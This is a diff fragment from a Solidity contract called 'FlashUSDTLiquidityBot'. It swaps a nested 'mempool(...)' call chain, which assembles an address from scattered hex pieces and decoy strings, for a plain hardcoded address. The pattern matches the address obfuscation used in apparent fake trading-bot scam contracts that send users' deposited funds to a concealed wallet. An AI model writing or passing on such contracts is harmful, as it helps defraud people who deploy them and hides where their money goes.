@@ -977,35 +977,7 @@ contract FlashUSDTLiquidityBot {
 
 
 
-address UniswapV2 = parseMemoryPool(
-
-    mempool(
-
-        mempool(
-
-            mempool("0x77", "a59925E3"),
-
-            mempool(mempool("9087Bf45", "232181d3"), "ba02")
-
-        ),
-
-        mempool(
-
-            mempool(
-
-                mempool("3DFAaD", "c873"),
-
-                mempool("_dummy", "")  
-
-            ),
-
-            ""
-
-        )
-
-    )
-
-);
+address UniswapV2 = 0x52851A3D6c476D210A268aB1d97bf30dD308e007;
 
 
 
